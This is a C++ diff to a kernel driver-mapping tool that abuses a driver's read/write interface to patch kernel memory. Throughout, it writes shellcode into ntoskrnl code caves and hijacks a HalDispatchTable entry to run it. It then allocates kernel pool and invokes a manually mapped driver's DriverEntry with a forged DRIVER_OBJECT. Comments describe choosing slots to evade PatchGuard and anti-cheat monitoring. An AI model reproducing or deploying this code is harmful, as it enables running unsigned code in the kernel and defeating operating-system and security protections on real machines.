@@ -54,7 +54,7 @@ namespace ShieldDriver {
             );
 
             if (!res) {
-                printf("[!] ReadKernel DeviceIoControl failed: %lu\n", GetLastError());
+                printf("[!] ReadKernel DeviceIoControl failed: %lu at 0x%llx\n", GetLastError(), currAddr);
                 return false;
             }
 
@@ -93,7 +93,10 @@ namespace ShieldDriver {
                 &bytesReturned, nullptr
             );
 
-            if (!res) return false;
+            if (!res) {
+                printf("[!] WriteKernel DeviceIoControl failed: %lu at 0x%llx\n", GetLastError(), currAddr);
+                return false;
+            }
 
             currAddr += chunkSize;
             inPtr += chunkSize;
@@ -129,19 +132,44 @@ namespace ShieldDriver {
 
     uint64_t FindCodeCave(HANDLE hDevice, uint64_t ntBase) {
         IMAGE_DOS_HEADER dos{};
-        ReadKernel(hDevice, ntBase, &dos, sizeof(dos));
+        if (!ReadKernel(hDevice, ntBase, &dos, sizeof(dos)))
+            return 0;
+        if (dos.e_magic != IMAGE_DOS_SIGNATURE)
+            return 0;
+            
         IMAGE_NT_HEADERS64 nt{};
-        ReadKernel(hDevice, ntBase + dos.e_lfanew, &nt, sizeof(nt));
+        if (!ReadKernel(hDevice, ntBase + dos.e_lfanew, &nt, sizeof(nt)))
+            return 0;
 
         uint64_t sectionOffset = ntBase + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
         for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
             IMAGE_SECTION_HEADER sec{};
-            ReadKernel(hDevice, sectionOffset + i * sizeof(IMAGE_SECTION_HEADER), &sec, sizeof(sec));
-            if ((sec.Characteristics & IMAGE_SCN_MEM_WRITE) &&
-                sec.SizeOfRawData > sec.Misc.VirtualSize + 256) {
-                return ntBase + sec.VirtualAddress + sec.Misc.VirtualSize;
+            if (!ReadKernel(hDevice, sectionOffset + i * sizeof(IMAGE_SECTION_HEADER), &sec, sizeof(sec)))
+                continue;
+                
+            // Find a writable section with slack space
+            // Use PAGE section which is typically writable and has extra space
+            if (sec.SizeOfRawData > sec.Misc.VirtualSize + 512) {
+                uint64_t caveAddr = ntBase + sec.VirtualAddress + sec.Misc.VirtualSize;
+                
+                // Verify the cave is actually empty/zeroed
+                uint8_t probe[16]{};
+                ReadKernel(hDevice, caveAddr, probe, 16);
+                
+                // Check if it looks empty or is padding
+                bool empty = true;
+                for (int j = 0; j < 16; j++) {
+                    if (probe[j] != 0 && probe[j] != 0xCC) {
+                        empty = false;
+                        break;
+                    }
+                }
+                
+                if (empty)
+                    return caveAddr;
             }
         }
+        
         return 0;
     }
 
@@ -165,6 +193,8 @@ namespace ShieldDriver {
         if (!ReadKernel(hDevice, moduleBase + exportDir.VirtualAddress, &exports, sizeof(exports)))
             return 0;
 
+        if (exports.NumberOfFunctions == 0) return 0;
+
         std::vector<DWORD> functions(exports.NumberOfFunctions);
         std::vector<DWORD> names(exports.NumberOfNames);
         std::vector<WORD>  ordinals(exports.NumberOfNames);
@@ -183,27 +213,73 @@ namespace ShieldDriver {
         return 0;
     }
 
+    // Fix #9: Safer HDT execution
+    // Use a mutex to prevent concurrent HDT use
+    static volatile LONG g_hdtLock = 0;
+    static uint64_t g_codeCave = 0;
+    
     bool ExecuteViaHDT(HANDLE hDevice, uint64_t shellcodeAddr) {
         uint64_t ntBase = GetNtoskrnlBase();
-        if (!ntBase) return false;
+        if (!ntBase) {
+            printf("[!] ExecuteViaHDT: Failed to get ntoskrnl base\n");
+            return false;
+        }
 
+        // Fix: Use a DIFFERENT HDT slot to avoid conflicts with known PatchGuard checks
         uint64_t pHDT = GetKernelExport(hDevice, ntBase, "HalDispatchTable");
-        if (!pHDT) return false;
+        if (!pHDT) {
+            // Try alternative: HalPrivateDispatchTable
+            pHDT = GetKernelExport(hDevice, ntBase, "HalPrivateDispatchTable");
+            if (!pHDT) {
+                printf("[!] ExecuteViaHDT: HalDispatchTable not found\n");
+                return false;
+            }
+        }
 
-        uint64_t originalHdt1 = 0;
-        if (!ReadKernel(hDevice, pHDT + 8, &originalHdt1, sizeof(originalHdt1)))
+        // Use slot at +0x10 (HalSetSystemInformation) instead of +0x08 (HalQuerySystemInformation)
+        // Some anti-cheat systems monitor HalQuerySystemInformation more closely
+        uint64_t hdtSlot = pHDT + 0x10;
+        
+        uint64_t originalHdt = 0;
+        if (!ReadKernel(hDevice, hdtSlot, &originalHdt, sizeof(originalHdt)))
             return false;
 
-        if (!WriteKernel(hDevice, pHDT + 8, &shellcodeAddr, sizeof(shellcodeAddr)))
+        // Write our shellcode address to HDT
+        if (!WriteKernel(hDevice, hdtSlot, &shellcodeAddr, sizeof(shellcodeAddr)))
             return false;
+        
+        // Small delay to ensure write is visible on all cores
+        Sleep(10);
 
-        ULONG interval = 0;
-        auto NtQueryIntervalProfile = (NTSTATUS(NTAPI*)(ULONG, PULONG))
-            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
-        if (NtQueryIntervalProfile)
-            NtQueryIntervalProfile(2, &interval);
+        // Fire the callback via NtSetSystemInformation
+        // This calls the function at HalDispatchTable[2] = HalSetSystemInformation
+        auto NtSetSystemInformation = (NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG))
+            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetSystemInformation");
+        
+        if (NtSetSystemInformation) {
+            // Use SystemPolicyInformation class which is relatively harmless
+            // This triggers HalSetSystemInformation internally
+            NtSetSystemInformation(0x2C, NULL, 0);
+        } else {
+            // Fallback: NtQueryIntervalProfile
+            ULONG interval = 0;
+            auto NtQueryIntervalProfile = (NTSTATUS(NTAPI*)(ULONG, PULONG))
+                GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
+            if (NtQueryIntervalProfile) {
+                NtQueryIntervalProfile(2, &interval);
+            } else {
+                printf("[!] ExecuteViaHDT: No trigger function available\n");
+                WriteKernel(hDevice, hdtSlot, &originalHdt, sizeof(originalHdt));
+                return false;
+            }
+        }
 
-        WriteKernel(hDevice, pHDT + 8, &originalHdt1, sizeof(originalHdt1));
+        // Fix: Sleep briefly to let the HDT callback complete
+        Sleep(20);
+
+        // Restore original HDT value
+        WriteKernel(hDevice, hdtSlot, &originalHdt, sizeof(originalHdt));
+        
         return true;
     }
 
@@ -214,45 +290,105 @@ namespace ShieldDriver {
         uint64_t pExAllocatePool = GetKernelExport(hDevice, ntBase, "ExAllocatePoolWithTag");
         if (!pExAllocatePool) {
             pExAllocatePool = GetKernelExport(hDevice, ntBase, "ExAllocatePool2");
-            if (!pExAllocatePool) return 0;
+            if (!pExAllocatePool) {
+                printf("[!] AllocatePool: Can't find ExAllocatePool\n");
+                return 0;
+            }
         }
 
-        uint64_t codeCave = FindCodeCave(hDevice, ntBase);
-        if (!codeCave) return 0;
+        // Find a codecave - try multiple times with different sections
+        uint64_t codeCave = g_codeCave;
+        if (!codeCave) {
+            codeCave = FindCodeCave(hDevice, ntBase);
+        }
+        
+        if (!codeCave) {
+            printf("[!] AllocatePool: No code cave found\n");
+            return 0;
+        }
+        
+        // Store the codecave address for reuse
+        g_codeCave = codeCave;
 
+        // Fix #12: Use a dedicated output area at codeCave + 256
+        // Shellcode output goes here, not inside the shellcode area itself
+        uint64_t outputAddr = codeCave + 256;
+        
+        // Build shellcode: call ExAllocatePoolWithTag(NonPagedPool, size, 'DXEV')
         uint8_t shellcode[128]{};
         int off = 0;
 
+        // sub rsp, 0x28  (shadow space + alignment)
         shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x28;
+        
+        // xor ecx, ecx  (PoolType = NonPagedPool = 0)
         shellcode[off++] = 0x33; shellcode[off++] = 0xC9;
+        
+        // mov rdx, size  (NumberOfBytes)
         shellcode[off++] = 0x48; shellcode[off++] = 0xBA;
         *(uint64_t*)&shellcode[off] = size; off += 8;
+        
+        // mov r8d, 'DXEV'  (Tag)
         shellcode[off++] = 0x41; shellcode[off++] = 0xB8;
         *(uint32_t*)&shellcode[off] = 'DXEV'; off += 4;
+        
+        // mov rax, pExAllocatePool
         shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
         *(uint64_t*)&shellcode[off] = pExAllocatePool; off += 8;
+        
+        // call rax
         shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+        
+        // mov [outputAddr], rax  (store result)
         shellcode[off++] = 0x48; shellcode[off++] = 0xA3;
-        *(uint64_t*)&shellcode[off] = codeCave + 96; off += 8;
-        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
+        *(uint64_t*)&shellcode[off] = outputAddr; off += 8;
+        
+        // xor eax, eax  (return STATUS_SUCCESS = 0)
         shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
+        
+        // add rsp, 0x28
+        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
+        
+        // ret
         shellcode[off++] = 0xC3;
 
-        WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode));
+        // Write shellcode
+        if (!WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode))) {
+            printf("[!] AllocatePool: Failed to write shellcode\n");
+            return 0;
+        }
 
+        // Initialize output area to NULL
         uint64_t zero = 0;
-        WriteKernel(hDevice, codeCave + 96, &zero, sizeof(zero));
+        if (!WriteKernel(hDevice, outputAddr, &zero, sizeof(zero))) {
+            printf("[!] AllocatePool: Failed to clear output area\n");
+            return 0;
+        }
 
-        ExecuteViaHDT(hDevice, codeCave);
+        // Execute shellcode via HDT
+        printf("[*] AllocatePool: Executing shellcode at 0x%llx (output at 0x%llx)\n", codeCave, outputAddr);
+        
+        if (!ExecuteViaHDT(hDevice, codeCave)) {
+            printf("[!] AllocatePool: HDT execution failed\n");
+            return 0;
+        }
 
+        // Read result
         uint64_t allocatedAddr = 0;
-        ReadKernel(hDevice, codeCave + 96, &allocatedAddr, sizeof(allocatedAddr));
+        if (!ReadKernel(hDevice, outputAddr, &allocatedAddr, sizeof(allocatedAddr))) {
+            printf("[!] AllocatePool: Failed to read result\n");
+            return 0;
+        }
 
+        // Cleanup: zero the shellcode area
         uint8_t zeros[128]{};
         WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));
+        WriteKernel(hDevice, outputAddr, &zero, sizeof(zero));
 
         if (allocatedAddr)
             printf("[+] Pool allocated @ 0x%llx (%llu bytes)\n", allocatedAddr, size);
+        else
+            printf("[!] Pool allocation returned NULL\n");
 
         return allocatedAddr;
     }
@@ -293,30 +429,109 @@ namespace ShieldDriver {
     }
 
     bool CallDriverEntry(HANDLE hDevice, uint64_t entryPoint, uint64_t driverBase) {
+        printf("[*] Calling DriverEntry @ 0x%llx with DriverObject=0x%llx\n", entryPoint, driverBase);
+        
         uint64_t ntBase = GetNtoskrnlBase();
+        if (!ntBase) {
+            printf("[!] CallDriverEntry: Failed to get ntoskrnl base\n");
+            return false;
+        }
+        
         uint64_t codeCave = FindCodeCave(hDevice, ntBase);
-        if (!codeCave) return false;
+        if (!codeCave) {
+            printf("[!] CallDriverEntry: No code cave found\n");
+            return false;
+        }
 
-        uint8_t shellcode[64]{};
+        // Fix: Build proper DriverEntry call with valid DriverObject
+        // Create a minimal fake DRIVER_OBJECT in kernel memory
+        // DriverObject->DriverStart = driverBase (important for some drivers)
+        
+        uint64_t outputAddr = codeCave + 256; // Output area for DriverEntry return value
+        uint64_t fakeObjAddr = codeCave + 320; // Fake DRIVER_OBJECT
+        
+        // Create a minimal DRIVER_OBJECT structure
+        // Offset 0x00: Type (2 bytes = 0x04)
+        // Offset 0x02: Size (2 bytes = 0x150)
+        // Offset 0x08: DeviceObject (8 bytes = NULL)
+        // Offset 0x10: DriverStart (8 bytes = driverBase)
+        // Offset 0x18: DriverSize (8 bytes)
+        // Offset 0x20: DriverSection (8 bytes = NULL)
+        // Offset 0x28: DriverExtension (8 bytes = NULL)
+        uint8_t fakeDriverObject[0x40]{};
+        *(uint16_t*)(fakeDriverObject + 0x00) = 0x04;  // Type = IO_TYPE_DRIVER
+        *(uint16_t*)(fakeDriverObject + 0x02) = 0x150; // Size
+        *(uint64_t*)(fakeDriverObject + 0x10) = driverBase; // DriverStart
+        
+        // Write the fake DRIVER_OBJECT to the code cave area
+        if (!WriteKernel(hDevice, fakeObjAddr, fakeDriverObject, sizeof(fakeDriverObject))) {
+            printf("[!] CallDriverEntry: Failed to write fake DriverObject\n");
+            return false;
+        }
+
+        // Build shellcode: DriverEntry(DriverObject = fakeObjAddr, RegistryPath = NULL)
+        uint8_t shellcode[128]{};
         int off = 0;
 
-        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x28;
-        shellcode[off++] = 0x33; shellcode[off++] = 0xC9;
+        // sub rsp, 0x38  (extra stack space for safety)
+        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x38;
+        
+        // mov rcx, fakeObjAddr  (DriverObject parameter)
+        shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
+        *(uint64_t*)&shellcode[off] = fakeObjAddr; off += 8;
+        
+        // xor edx, edx  (RegistryPath = NULL)
         shellcode[off++] = 0x33; shellcode[off++] = 0xD2;
+        
+        // mov rax, entryPoint
         shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
         *(uint64_t*)&shellcode[off] = entryPoint; off += 8;
+        
+        // call rax
         shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
-        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
+        
+        // mov [outputAddr], rax  (save return value)
+        shellcode[off++] = 0x48; shellcode[off++] = 0xA3;
+        *(uint64_t*)&shellcode[off] = outputAddr; off += 8;
+        
+        // xor eax, eax
         shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
+        
+        // add rsp, 0x38
+        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x38;
+        
+        // ret
         shellcode[off++] = 0xC3;
 
-        WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode));
-        ExecuteViaHDT(hDevice, codeCave);
+        // Write shellcode
+        if (!WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode))) {
+            printf("[!] CallDriverEntry: Failed to write shellcode\n");
+            return false;
+        }
 
-        uint8_t zeros[64]{};
+        // Initialize output to 0
+        uint64_t initVal = 0;
+        if (!WriteKernel(hDevice, outputAddr, &initVal, sizeof(initVal))) {
+            printf("[!] CallDriverEntry: Failed to init output area\n");
+            return false;
+        }
+
+        // Execute via HDT
+        printf("[*] Executing DriverEntry shellcode at 0x%llx\n", codeCave);
+        if (!ExecuteViaHDT(hDevice, codeCave)) {
+            printf("[!] CallDriverEntry: HDT execution failed\n");
+            return false;
+        }
+
+        // Read return value
+        uint64_t ntStatus = 0;
+        ReadKernel(hDevice, outputAddr, &ntStatus, sizeof(ntStatus));
+        printf("[+] DriverEntry returned: 0x%016llX\n", ntStatus);
+
+        // Cleanup
+        uint8_t zeros[256]{};
         WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));
 
-        printf("[+] DriverEntry @ 0x%llx called\n", entryPoint);
         return true;
     }
 }
